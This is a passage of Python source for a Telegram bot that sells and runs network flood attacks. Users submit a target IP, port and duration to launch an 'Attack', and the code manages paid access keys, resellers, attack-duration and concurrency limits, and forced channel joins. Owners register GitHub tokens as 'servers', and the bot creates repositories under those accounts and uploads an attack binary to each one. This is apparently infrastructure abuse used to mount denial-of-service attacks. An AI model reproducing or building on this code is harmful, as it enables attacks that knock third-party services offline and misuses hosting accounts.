        await update.message.reply_text("Usage: `/setconcurrent <number>` (e.g. `/setconcurrent 5` or `/setconcurrent 6`)", parse_mode="HTML")
        return
    
    try:
        limit = int(context.args[0])
        if limit < 1:
            await update.message.reply_text("❌ Must be at least 1")
            return
        
        global MAX_CONCURRENT_ATTACKS
        MAX_CONCURRENT_ATTACKS = limit
        save_max_concurrent_attacks(limit)
        await update.message.reply_text(f"✅ Max concurrent users/attacks limit set to <code>{MAX_CONCURRENT_ATTACKS}</code>.", parse_mode="HTML")
    except ValueError:
        await update.message.reply_text("❌ Invalid number")

async def userslist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    if not approved_users:
        await update.message.reply_text("📭 No approved users")
        return
    
    users_list = "👤 **ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀs ʟɪsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    count = 1
    for uid, user_info in approved_users.items():
        username = user_info.get('username', f'user_{uid}')
        expiry = user_info.get('expiry', 'LIFETIME')
        if expiry == "LIFETIME":
            remaining = "LIFETIME"
        else:
            try:
                expiry_time = float(expiry)
                current_time = time.time()
                if current_time > expiry_time:
                    remaining = "EXPIRED"
                else:
                    days_left = int((expiry_time - current_time) / (24 * 3600))
                    hours_left = int(((expiry_time - current_time) % (24 * 3600)) / 3600)
                    remaining = f"{days_left}d {hours_left}h"
            except:
                remaining = "UNKNOWN"
        users_list += f"{count}. `{uid}` - @{username} | Expiry: {remaining}\n"
        count += 1
    
    await update.message.reply_text(users_list)

async def maintenance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: `/maintenance <on/off>`")
        return
    
    mode = context.args[0].lower()
    global MAINTENANCE_MODE
    if mode == "on":
        MAINTENANCE_MODE = True
        save_maintenance_mode(True)
        await update.message.reply_text("🔧 **Maintenance mode ENABLED**")
    elif mode == "off":
        MAINTENANCE_MODE = False
        save_maintenance_mode(False)
        await update.message.reply_text("✅ **Maintenance mode DISABLED**")
    else:
        await update.message.reply_text("❌ Use 'on' or 'off'")

async def setlog_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: `/setlog <chat_id>`")
        return
        
    chat_id_str = context.args[0]
    try:
        chat_id = int(chat_id_str)
        save_log_channel(chat_id)
        await update.message.reply_text(f"✅ **Logging Channel/Group set to:** `{chat_id}`")
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid numeric Chat ID.")

async def setmaxtime_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: `/setmaxtime <seconds>`")
        return
        
    try:
        new_time = int(context.args[0])
        if new_time <= 0:
            await update.message.reply_text("❌ Time must be a positive number")
            return
        global MAX_ATTACK_DURATION
        MAX_ATTACK_DURATION = new_time
        save_max_time(new_time)
        await update.message.reply_text(f"✅ **Maximum attack duration set to:** `{MAX_ATTACK_DURATION}` seconds.")
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number.")

async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("Usage: `/add <ID> <DAYS>` (0 for lifetime)")
        return
    
    try:
        new_user_id = int(context.args[0])
        days = int(context.args[1])
        
        pending_users[:] = [u for u in pending_users if str(u['user_id']) != str(new_user_id)]
        save_pending_users(pending_users)
        
        expiry = "LIFETIME" if days == 0 else time.time() + (days * 86400)
        approved_users[str(new_user_id)] = {
            "username": update.effective_user.username or f"user_{new_user_id}",
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": expiry,
            "days": days
        }
        save_approved_users(approved_users)
        
        try:
            await context.bot.send_message(
                chat_id=new_user_id,
                text=f"✅ **Access Approved for {days if days > 0 else 'Lifetime'} Days!**",
                reply_markup=get_user_keyboard()
            )
        except:
            pass
        
        await update.message.reply_text(f"✅ User `{new_user_id}` added for {days} days.")
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID or Days")

async def approveuserslist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    if not pending_users:
        await update.message.reply_text("📭 No pending requests")
        return
    
    pending_list = "⏳ **ᴘᴇɴᴅɪɴɢ ʀᴇǫᴜᴇsᴛs**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for user in pending_users:
        pending_list += f"• `{user['user_id']}` - @{user['username']}\n"
    await update.message.reply_text(pending_list)

async def ownerlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    owners_list = "👑 **ᴏᴡɴᴇʀs ʟɪsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for owner_id, owner_info in owners.items():
        username = owner_info.get('username', f'owner_{owner_id}')
        is_primary = owner_info.get('is_primary', False)
        owners_list += f"• `{owner_id}` - @{username}"
        if is_primary:
            owners_list += " 👑 (PRIMARY)"
        owners_list += "\n"
    await update.message.reply_text(owners_list)

async def adminlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    if not admins:
        await update.message.reply_text("📭 No admins")
        return
    admins_list = "🛡️ **ᴀᴅᴍɪɴs ʟɪsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for admin_id, admin_info in admins.items():
        admins_list += f"• `{admin_id}` - @{admin_info.get('username', f'admin_{admin_id}')}\n"
    await update.message.reply_text(admins_list)

async def resellerlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    if not resellers:
        await update.message.reply_text("📭 No resellers")
        return
    resellers_list = "💰 **ʀᴇsᴇʟʟᴇʀs ʟɪsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for reseller_id, reseller_info in resellers.items():
        resellers_list += f"• `{reseller_id}` - @{reseller_info.get('username', reseller_id)}\n"
    await update.message.reply_text(resellers_list)

async def listgrp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    if not groups:
        await update.message.reply_text("📭 No groups")
        return
    groups_list = "👥 **ɢʀᴏᴜᴘs ʟɪsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for group_id, group_info in groups.items():
        groups_list += f"• `{group_id}` - {group_info.get('name', 'UNKNOWN')}\n"
    await update.message.reply_text(groups_list)

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return ConversationHandler.END
    await update.message.reply_text("📢 **Send broadcast message text:**")
    return WAITING_FOR_BROADCAST

async def broadcast_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return ConversationHandler.END
    message = update.message.text
    await send_broadcast(update, context, message)
    return ConversationHandler.END

async def send_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE, message: str):
    all_users = set()
    for u in approved_users.keys(): all_users.add(int(u))
    for u in resellers.keys(): all_users.add(int(u))
    for u in admins.keys(): all_users.add(int(u))
    for u in owners.keys(): all_users.add(int(u))
    
    total_users = len(all_users)
    success_count = 0
    fail_count = 0
    progress_msg = await update.message.reply_text(f"📢 Sending broadcast to {total_users} users...")
    
    for uid in all_users:
        try:
            await context.bot.send_message(chat_id=uid, text=message, parse_mode="HTML")
            success_count += 1
            time.sleep(0.1)
        except Exception:
            fail_count += 1
    await progress_msg.edit_text(f"✅ Broadcast complete. Success: {success_count}, Failed: {fail_count}")

async def addowner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_primary_owner(user_id):
        await update.message.reply_text("⚠️ **Only Primary Owners can add owners.**")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: `/addowner <USER_ID> <USERNAME>`")
        return
    try:
        new_owner_id = int(context.args[0])
        username = context.args[1]
        owners[str(new_owner_id)] = {
            "username": username, "added_by": user_id, "added_date": time.strftime("%Y-%m-%d %H:%M:%S"), "is_primary": False
        }
        save_owners(owners)
        await update.message.reply_text(f"✅ Owner `{new_owner_id}` (@{username}) added.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")

async def deleteowner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_primary_owner(user_id):
        await update.message.reply_text("⚠️ **Only Primary Owners can remove owners.**")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: `/deleteowner <USER_ID>`")
        return
    try:
        to_remove = int(context.args[0])
        if str(to_remove) not in owners:
            await update.message.reply_text("❌ User is not an owner")
            return
        if owners[str(to_remove)].get("is_primary", False):
            await update.message.reply_text("❌ Cannot remove primary owner")
            return
        del owners[str(to_remove)]
        save_owners(owners)
        await update.message.reply_text(f"✅ Owner `{to_remove}` removed.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")

async def addreseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **Only owners can add resellers.**")
        return
    if len(context.args) < 3:
        await update.message.reply_text("Usage: `/addreseller <USER_ID> <CREDITS> <USERNAME>`")
        return
    try:
        reseller_id = int(context.args[0])
        credits = int(context.args[1])
        username = context.args[2]
        resellers[str(reseller_id)] = {
            "username": username, "credits": credits, "added_by": user_id, "added_date": time.strftime("%Y-%m-%d %H:%M:%S"), "expiry": "LIFETIME"
        }
        save_resellers(resellers)
        await update.message.reply_text(f"✅ Reseller `{reseller_id}` (@{username}) added.")
    except ValueError:
        await update.message.reply_text("❌ Invalid ID or credits")

async def removereseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **Only owners can remove resellers.**")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: `/removereseller <USER_ID>`")
        return
    try:
        reseller_id = int(context.args[0])
        if str(reseller_id) in resellers:
            del resellers[str(reseller_id)]
            save_resellers(resellers)
            await update.message.reply_text(f"✅ Reseller `{reseller_id}` removed.")
        else:
            await update.message.reply_text("❌ User is not a reseller")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")

async def addtoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **Only owners can add tokens.**")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: `/addtoken <GITHUB_TOKEN>`")
        return
    token = context.args[0]
    repo_name = "flamedev-tg"
    try:
        for existing in github_tokens:
            if existing['token'] == token:
                await update.message.reply_text("❌ Token already exists.")
                return
        g = Github(token)
        user = g.get_user()
        username = user.login
        repo, created = create_repository(token, repo_name)
        new_token_data = {
            'token': token, 'username': username, 'repo': f"{username}/{repo_name}", 'added_date': time.strftime("%Y-%m-%d %H:%M:%S"), 'status': 'active'
        }
        github_tokens.append(new_token_data)
        save_github_tokens(github_tokens)
        await update.message.reply_text(f"✅ Token added for `{username}`. Total servers: {len(github_tokens)}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def tokens_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **Only owners can view tokens.**")
        return
    if not github_tokens:
        await update.message.reply_text("📭 No tokens added yet.")
        return
    text = "🔑 **sᴇʀᴠᴇʀs ʟɪsᴛ:**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for i, t in enumerate(github_tokens, 1):
        text += f"{i}. 👤 `{t['username']}` | 📁 `{t['repo']}`\n"
    await update.message.reply_text(text)

async def removetoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **Only owners can remove tokens.**")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: `/removetoken <NUMBER>`")
        return
    try:
        num = int(context.args[0])
        if num < 1 or num > len(github_tokens):
            await update.message.reply_text("❌ Invalid number")
            return
        removed = github_tokens.pop(num - 1)
        save_github_tokens(github_tokens)
        await update.message.reply_text(f"✅ Server `{removed['username']}` removed.")
    except ValueError:
        await update.message.reply_text("❌ Invalid number")

async def binary_upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **Only owners can upload binary.**")
        return ConversationHandler.END
    if not github_tokens:
        await update.message.reply_text("❌ No servers available.")
        return ConversationHandler.END
    await update.message.reply_text("📤 Please send your binary file now...")
    return WAITING_FOR_BINARY

async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return ConversationHandler.END
    if not update.message.document:
        await update.message.reply_text("❌ Send a file, not text.")
        return WAITING_FOR_BINARY
    
    progress_msg = await update.message.reply_text("📥 Downloading binary file...")
    try:
        file = await update.message.document.get_file()
        file_path = f"temp_binary_{user_id}.bin"
        await file.download_to_drive(file_path)
        with open(file_path, 'rb') as f:
            binary_content = f.read()
        file_size = len(binary_content)
        await progress_msg.edit_text(f"📊 Downloaded {file_size} bytes. Uploading to GitHub repos...")
        
        success_count = 0
        fail_count = 0
        results = []
        
        def upload_to_repo(token_data):
            try:
                g = Github(token_data['token'])
                repo = g.get_repo(token_data['repo'])
                try:
                    existing = repo.get_contents(BINARY_FILE_NAME)
                    repo.update_file(BINARY_FILE_NAME, "Update binary", binary_content, existing.sha, branch="main")
                except Exception:
                    repo.create_file(BINARY_FILE_NAME, "Upload binary", binary_content, branch="main")
                results.append((token_data['username'], True, "OK"))
            except Exception as ex:
                logger.error(f"Error uploading binary to {token_data.get('repo')}: {ex}")
                results.append((token_data['username'], False, str(ex)))
        
        threads = []
        for token_data in github_tokens:
            t = threading.Thread(target=upload_to_repo, args=(token_data,))
            threads.append(t)
            t.start()
        for t in threads: t.join()
        
        fail_details = []
        for username, succ, err_msg in results:
            if succ:
                success_count += 1
            else:
                fail_count += 1
                # Escape HTML special characters in username and err_msg
                safe_user = username.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                safe_err = str(err_msg).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                fail_details.append(f"• <b>{safe_user}</b>: <code>{safe_err}</code>")
        
        if os.path.exists(file_path):
            os.remove(file_path)
            
        res_text = (
            f"<tg-emoji emoji-id='5208748315805499400'>✅</tg-emoji> <b>ʙɪɴᴀʀʏ ᴜᴘʟᴏᴀᴅ ғɪɴɪsʜᴇᴅ!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• <b>sᴜᴄᴄᴇss:</b> <code>{success_count}</code>\n"
            f"• <b>ғᴀɪʟᴇᴅ:</b> <code>{fail_count}</code>"
        )
        if fail_details:
            res_text += "\n\n<tg-emoji emoji-id='5258274739041883702'>❌</tg-emoji> <b>ғᴀɪʟᴜʀᴇs:</b>\n" + "\n".join(fail_details)
        await progress_msg.edit_text(res_text, parse_mode="HTML")
    except Exception as e:
        safe_e = str(e).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        await progress_msg.edit_text(f"<tg-emoji emoji-id='5258274739041883702'>❌</tg-emoji> <b>ᴇʀʀᴏʀ:</b> {safe_e}", parse_mode="HTML")
    return ConversationHandler.END

async def cancel_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Upload cancelled.")
    return ConversationHandler.END

# Text Handler for Bottom Menu Buttons
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
    
    text = update.message.text.strip()
    if text.startswith('/'):
        return
        
    user_id = update.effective_user.id
    
    # Process channel creation flow if active
    if user_id in channel_setup_state:
        setup = channel_setup_state[user_id]
        if setup["step"] == "name":
            setup["name"] = text
            setup["step"] = "link"
            await update.message.reply_text(
                f"✅ Name set to: <b>{text}</b>\n\n"
                f"Now send the <b>Invite Link / Username</b> for the channel:",
                parse_mode="HTML"
            )
            return
        elif setup["step"] == "link":
            setup["link"] = text
            if setup["type"] == "private":
                setup["step"] = "id"
                await update.message.reply_text(
                    f"✅ Link set to: <code>{text}</code>\n\n"
                    f"Now send the <b>Channel Chat ID</b> (e.g., -1001234567890):",
                    parse_mode="HTML"
                )
            else:
                # Public channels don't strictly require a chat_id but let's resolve it
                chat_id = None
                identifier = text
                if identifier.startswith("@"):
                    chat_id = identifier
                elif "t.me/" in identifier:
                    username_part = identifier.split("t.me/")[-1].replace("/", "")
                    chat_id = f"@{username_part}"
                else:
                    chat_id = identifier
                
                new_channel = {
                    "id": f"channel_{int(time.time())}_{random.randint(1000, 9999)}",
                    "type": "public",
                    "identifier": identifier,
                    "chat_id": chat_id,
                    "name": setup["name"],
                    "invite_link": identifier if "t.me/" in identifier else f"https://t.me/{identifier.replace('@', '')}",
                    "added_by": user_id,
                    "added_at": datetime.now().isoformat()
                }
                force_join_db["force_join_channels"].append(new_channel)
                save_force_join(force_join_db)
                del channel_setup_state[user_id]
                await update.message.reply_text(
                    f"🎉 Public channel <b>{new_channel['name']}</b> added successfully!",
                    reply_markup=get_user_keyboard(),
                    parse_mode="HTML"
                )
            return
        elif setup["step"] == "id":
            try:
                chat_id = int(text)
            except ValueError:
                await update.message.reply_text("❌ Invalid ID! Please send a numeric integer ID:")
                return
            
            identifier = setup["link"]
            new_channel = {
                "id": f"channel_{int(time.time())}_{random.randint(1000, 9999)}",
                "type": "private",
                "identifier": identifier,
                "chat_id": chat_id,
                "name": setup["name"],
                "invite_link": identifier,
                "added_by": user_id,
                "added_at": datetime.now().isoformat()
            }
            force_join_db["force_join_channels"].append(new_channel)
            save_force_join(force_join_db)
            del channel_setup_state[user_id]
            await update.message.reply_text(
                f"🎉 Private channel <b>{new_channel['name']}</b> added successfully!",
                reply_markup=get_user_keyboard(),
                parse_mode="HTML"
            )
            return
    
    # Check Force Join first
    is_joined, unjoined = await check_force_join(context.bot, user_id)
    if not is_joined:
        # Prompt user to join the channels
        ch_list_text = ""
        buttons = []
        row = []
        for ch in unjoined:
            ch_list_text += f"• <b>{ch['name']}</b> ({ch['type']})\n"
            btn = InlineKeyboardButton(
                f"Join {ch['name']}", 
                url=ch['invite_link'], 
                style="primary", 
                icon_custom_emoji_id="5427168083074628963"
            )
            row.append(btn)
            if len(row) == 2:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)
        
        # Add a check subscription button to verify again
        buttons.append([
            InlineKeyboardButton(
                "Verify Subscription", 
                callback_data="btn_verify_subscription", 
                style="primary", 
                icon_custom_emoji_id="5791697221799907788"
            )
        ])
        
        await update.message.reply_text(
            f"<tg-emoji emoji-id='6089079808187174973'>⚠️</tg-emoji> <b>ғᴏʀᴄᴇ ᴊᴏɪɴ ʀᴇǫᴜɪʀᴇᴅ</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"You must join our channels to use this bot:\n\n"
            f"{ch_list_text}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"After joining, tap verification button below.",
            reply_markup=InlineKeyboardMarkup(buttons),
            parse_mode="HTML"
        )
        return
    
    if text == "Attack":
        # Prompt directly for target details when the Attack button is pressed
        keyboard = [
            [
                InlineKeyboardButton("Canary APK", callback_data="btn_canary_apk", style="primary", icon_custom_emoji_id="6289414662173755415"),
                InlineKeyboardButton("How to use", callback_data="btn_how_to_use", style="primary", icon_custom_emoji_id="5258274739041883702")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"<tg-emoji emoji-id='6017356590238143173'>🎯</tg-emoji> <b>sᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Send target details directly.\n\n"
            "Format: <code>&lt;IP&gt; &lt;PORT&gt; &lt;TIME&gt;</code>\n"
            "Example:\n<code>1.1.1.1 80 60</code>",
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif text == "Status":
        await status_command(update, context)
    elif text == "Redeem Key":
        await update.message.reply_text(
            f"<tg-emoji emoji-id='6311935044017461530'>🔑</tg-emoji> <b>ʀᴇᴅᴇᴇᴍ ᴋᴇʏ</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Send your access key directly to redeem it.\n\n"
            "Format: <code>&lt;KEY&gt;</code>\n"
            "Example:\n<code>KEY-ABCD-1234</code>",
            reply_markup=get_user_keyboard(),
            parse_mode="HTML"
        )
    elif text == "My Access":
        await myaccess_command(update, context)
    elif text == "Help":
        await help_command(update, context)
    else:
        parts = text.split()
        if len(parts) == 3:
            ip, port, time_val = parts
            try:
                int(port)
                int(time_val)
                await run_attack(update, context, ip, port, time_val)
            except ValueError:
                pass
        elif len(parts) == 1:
            key_input = parts[0].strip()
            # If the single word is not a command, check if it's a key
            # We can run redeem_key_func on it
            success, message = redeem_key_func(key_input, update.effective_user.id)
            if success:
                # Key was valid, send success message
                await update.message.reply_text(message, reply_markup=get_user_keyboard(), parse_mode="HTML")
            else:
                # If key was invalid but starts with KEY- or is in keys_db, tell them it's invalid
                # otherwise ignore to avoid responding to every normal message
                is_likely_key = key_input.upper().startswith("KEY-") or key_input in keys_db
                if not is_likely_key:
                    for k in keys_db:
                        if k.lower() == key_input.lower():
                            is_likely_key = True
                            break
                if is_likely_key:
                    await update.message.reply_text(message, reply_markup=get_user_keyboard(), parse_mode="HTML")

def main():
    request = HTTPXRequest(
        connect_timeout=30.0,
        read_timeout=30.0,
        write_timeout=30.0,
        pool_timeout=30.0
    )
    application = Application.builder().token(BOT_TOKEN).request(request).build()
    
    conv_handler_binary = ConversationHandler(
        entry_points=[CommandHandler('binary_upload', binary_upload_command)],
        states={
            WAITING_FOR_BINARY: [
                MessageHandler(filters.Document.ALL, handle_binary_file),
                CommandHandler('cancel', cancel_upload)
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_upload)]
    )
    
    conv_handler_broadcast = ConversationHandler(
        entry_points=[CommandHandler('broadcast', broadcast_command)],
        states={
            WAITING_FOR_BROADCAST: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_message_handler),
                CommandHandler('cancel', cancel_upload)
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_upload)]
    )
    
    application.add_handler(conv_handler_binary)
    application.add_handler(conv_handler_broadcast)
    
    # User Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("myaccess", myaccess_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CommandHandler("addapk", addapk_command))
    application.add_handler(CommandHandler("setvideo", setvideo_command))
    
    # Inline Callback Query Handler
    application.add_handler(CallbackQueryHandler(callback_query_handler))
    
    # Admin Key & Cooldown Management Handlers
    application.add_handler(CommandHandler("admin", admin_command))
    application.add_handler(CommandHandler("addchannel", addchannel_command))
    application.add_handler(CommandHandler("delchannel", delchannel_command))
    application.add_handler(CommandHandler("addadmin", addadmin_command))
    application.add_handler(CommandHandler("removeadmin", removeadmin_command))
    application.add_handler(CommandHandler("genkey", genkey_command))
    application.add_handler(CommandHandler("gentrailkey", gentrailkey_command))
    application.add_handler(CommandHandler("keyslist", keyslist_command))
    application.add_handler(CommandHandler("delkey", delkey_command))
    application.add_handler(CommandHandler("setcooldown", setcooldown_command))
    application.add_handler(CommandHandler("setmaxattack", setmaxattack_command))
    application.add_handler(CommandHandler("block", block_command))
    application.add_handler(CommandHandler("unblock", unblock_command))
    application.add_handler(CommandHandler("listblocks", listblocks_command))
    application.add_handler(CommandHandler("setconcurrent", setconcurrent_command))
    
    # Admin Management Handlers
    application.add_handler(CommandHandler("add", add_command))
    application.add_handler(CommandHandler("remove", remove_command))
    application.add_handler(CommandHandler("userslist", userslist_command))
    application.add_handler(CommandHandler("approveuserslist", approveuserslist_command))
    application.add_handler(CommandHandler("ownerlist", ownerlist_command))
    application.add_handler(CommandHandler("adminlist", adminlist_command))
    application.add_handler(CommandHandler("resellerlist", resellerlist_command))
    application.add_handler(CommandHandler("listgrp", listgrp_command))
    application.add_handler(CommandHandler("maintenance", maintenance_command))
    application.add_handler(CommandHandler("setlog", setlog_command))
    application.add_handler(CommandHandler("setmaxtime", setmaxtime_command))
    
    application.add_handler(CommandHandler("addowner", addowner_command))
    application.add_handler(CommandHandler("deleteowner", deleteowner_command))
    application.add_handler(CommandHandler("addreseller", addreseller_command))
    application.add_handler(CommandHandler("removereseller", removereseller_command))
    
    application.add_handler(CommandHandler("addtoken", addtoken_command))
    application.add_handler(CommandHandler("tokens", tokens_command))
    application.add_handler(CommandHandler("removetoken", removetoken_command))
    application.add_handler(CommandHandler("removexpiredtoken", removexpiredtoken_command))
    
    # Text Handler for Bottom Menu Buttons
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 **THE BOT IS RUNNING...**")
    print("━━━━━━━━━━━━━━━━━━━━━━")
    print(f"👑 Primary Owners: {[uid for uid, info in owners.items() if info.get('is_primary', False)]}")
    print(f"📊 Approved Users: {len(approved_users)}")
    print(f"🔑 Servers: {len(github_tokens)}")
    print(f"⏳ Cooldown: {COOLDOWN_DURATION}s")
    print("━━━━━━━━━━━━━━━━━━━━━━")
    
    application.run_polling(bootstrap_retries=-1, poll_interval=1.0)

if __name__ == '__main__':
    main()